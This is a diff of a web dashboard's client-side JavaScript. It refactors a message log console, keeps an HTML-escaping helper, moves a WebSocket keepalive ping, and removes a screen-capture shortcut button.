 function addLog(cls, dir, content) {
-  const out = document.getElementById('log-output');
+  const out = document.getElementById('console-output');
   const d = document.createElement('div');
-  d.className = 'log-entry ' + cls;
-  const ts = new Date().toLocaleTimeString('en', { hour12: false });
-  const text = typeof content === 'object' ? JSON.stringify(content) : content;
-  d.innerHTML = `<span class="ts">${ts}</span><span class="dir">${dir}</span> <span class="log-json">${escHtml(text)}</span>`;
+  d.className = 'log-line ' + cls;
+  const ts = new Date().toLocaleTimeString('en', { hour12:false });
+  const text = typeof content === 'object' ? JSON.stringify(content) : String(content);
+  d.innerHTML = `<span class="log-ts">${ts}</span><span class="log-dir">${dir}</span><span class="log-body">${esc(text)}</span>`;
   out.appendChild(d);
   out.scrollTop = out.scrollHeight;
+  // Trim log to 200 entries
+  while (out.children.length > 200) out.removeChild(out.firstChild);
 }
 
-function logSent(msg) {
-  // Skip logging stream frames to avoid flooding
-  if (msg.type === 'stream_frame') return;
-  addLog('sent', '↑ SEND', msg);
-}
-function logRecv(msg) {
-  if (msg.type === 'stream_frame') return;
-  addLog('recv', '↓ RECV', msg);
-}
-function logErr(msg)  { addLog('err',  '✕ ERR ', msg); }
-function logInfo(msg) { addLog('info', '· INFO', msg); }
-function clearLog()   { document.getElementById('log-output').innerHTML = ''; }
+function logSent(msg) { addLog('sent', '↑', msg); }
+function logRecv(msg) { addLog('recv', '↓', msg); }
+function logErr(msg)  { addLog('err',  '✕', msg); }
+function logInfo(msg) { addLog('info', '·', msg); }
+function clearLog()   { document.getElementById('console-output').innerHTML = ''; }
 
-// ── Keepalive ping ───────────────────────────────────────────────
-setInterval(() => {
-  if (ws && ws.readyState === WebSocket.OPEN && authenticated) {
-    ws.send(JSON.stringify({ type: 'ping' }));
-  }
-}, 20000);
-
-// ── Snap screen shortcut ─────────────────────────────────────────
-document.getElementById('snap-screen-btn').onclick = () => {
-  sendCommand('screen_capture', {}, (msg) => {
-    if (msg.status === 'ok' || msg.status === 'success') {
-      const src = 'data:image/png;base64,' + msg.data.image_base64;
-      setStreamImage('screen-box', src);
-    }
-  });
-};
-
-// ── Sanitize ─────────────────────────────────────────────────────
-function escHtml(s) {
+// ══════════════════════════════════════════════════════
+// UTILS
+// ══════════════════════════════════════════════════════
+function esc(s) {
   return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
 }
 
+// Keepalive ping
+setInterval(() => {
+  if (ws && ws.readyState === WebSocket.OPEN && authenticated) {
+    ws.send(JSON.stringify({ type:'ping' }));
+  }
+}, 20000);
 </script>
 </body>
 </html>
